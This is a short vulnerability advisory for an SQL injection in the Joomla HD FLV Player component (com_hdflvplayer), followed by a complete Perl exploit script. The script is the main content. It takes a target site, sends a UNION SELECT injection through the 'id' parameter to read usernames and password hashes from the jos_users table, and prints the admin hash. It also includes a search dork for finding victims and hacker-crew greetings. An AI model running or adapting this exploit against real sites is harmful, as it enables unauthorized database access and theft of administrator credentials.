source: http://www.securityfocus.com/bid/38401/info

The HD FLV Player component for Joomla! is prone to an SQL-injection vulnerability because it fails to sufficiently sanitize user-supplied data before using it in an SQL query.

Exploiting this issue could allow an attacker to compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database. 

#!/usr/bin/perl -w
 
###############################################################################################
#
# [~] Joomla Component com_hdflvplayer SQL injection exploit - (id)
# [~] Author    : kaMtiEz (kamzcrew@yahoo.com)
# [~] Homepage  : http://www.indonesiancoder.com
# [~] Date  : 15 February, 2010
#
###############################################################################################
#
# [ Software Information ]
#
# [+] Vendor : http://www.hdflvplayer.net/
# [+] Price : $ 99.00
# [+] Vulnerability : SQL injection
# [+] Dork : inurl:"CIHUY"
# [+] Type : commercial
#
###############################################################################################
#
# USAGE : perl kaMz.pl
#
###############################################################################################
 
print "\t\t[!]=========================================================[!]\n\n";
print "\t\t               [~]  INDONESIANCODER TEAM  [~]                  \n\n";
print "\t\t[!]=========================================================[!]\n\n";
print "\t\t  [!]Joomla component com_hdflvplayer SQL injection exploit[!] \n\n";
print "\t\t                      [~] by kaMtiEz [~]                       \n\n";
print "\t\t[!]=========================================================[!]\n\n";
  
use LWP::UserAgent;
  
print "\nsite/path[!]http://www.indonesiancoder.com/kaMz/[!]:";
chomp(my $IBL13Z=<STDIN>);
  
$kaMtiEz="concat(username,0x3a,password)";
$tukulesto="jos_users";
$pathloader="com_hdflvplayer";
 
$r3m1ck = LWP::UserAgent->new() or die "Could not initialize browser\n";
$r3m1ck->agent('Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)');
  
$arianom = $IBL13Z . "/index.php?option=".$pathloader."&id=1+AND+1=2+UNION+SELECT+".$kaMtiEz.",1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18+from+".$tukulesto."--";
$gonzhack = $r3m1ck->request(HTTP::Request->new(GET=>$arianom));
$contrex = $gonzhack->content; if ($contrex =~/([0-9a-fA-F]{32})/){
print "\n[+] CIHUY Admin Password Nya GAN [+]: $1\n\n";
}
else{print "\n[+] Exploit GAGAL GAN ![+]\n";
}
 
##############################################################################################
#
# GREETZZZZZ :
#
# INDONESIAN CODER TEAM KILL-9 CREW KIRIK CREW MainHack ServerIsDown SurabayaHackerLink IndonesianHacker SoldierOfAllah
# tukulesto,M3NW5,arianom,tiw0L,abah_benu,d0ntcry,newbie_043,bobyhikaru,gonzhack
# Contrex,onthel,yasea,bugs,Ronz,Pathloader,cimpli,MarahMerah,ibl13z,r3m1ck
# Coracore,Gh4mb4s,Jack-,VycOd,m0rgue a.k.a mbamboenk
#
##############################################################################################